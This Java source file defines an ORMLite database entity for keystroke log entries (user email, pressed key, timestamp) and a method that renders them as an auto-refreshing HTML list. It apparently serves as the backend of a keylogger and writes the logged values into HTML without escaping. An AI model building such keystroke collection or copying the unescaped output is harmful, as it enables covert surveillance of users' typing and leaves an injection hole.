import com.j256.ormlite.field.DataType;
import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.table.DatabaseTable;

import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.Collection;
import java.util.Date;
import java.util.Formatter;
import java.util.stream.Collectors;
import java.util.stream.Stream;

@DatabaseTable(tableName = "keyLogsEntries")
public class KeyLogsEntry {

    @DatabaseField(generatedId = true)
    public int Id;

    @DatabaseField(canBeNull = false)
    public String UserEmail;

    @DatabaseField(canBeNull = false)
    public String Key;

    @DatabaseField(canBeNull = false, dataType = DataType.DATE_LONG)
    public Date TimeStamp;

    public static String ToHtmlString(Stream<KeyLogsEntry> kles){

        var templateString =
                "<li> " +
                    "User Mail: %1$s, TimeStamp: %2$s, Pressed Key: %3$s " +
                "</li>";
        var result =
                "<head>" +
                    "<meta http-equiv=\"refresh\" content=\"1\">" +
                "</head>" +
                "<ul>" +
                    kles.map(x ->
                    {
                        var s = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");
                        var sbuf = new StringBuilder();
                        var fmt = new Formatter(sbuf);
                        var res = fmt.format(templateString, x.UserEmail, String.format("%tF %<tT.%<tL", x.TimeStamp), x.Key).toString();
                        return res;
                    }).collect(Collectors.joining("")) +
                "</ul>";
        return  result;
    }
}

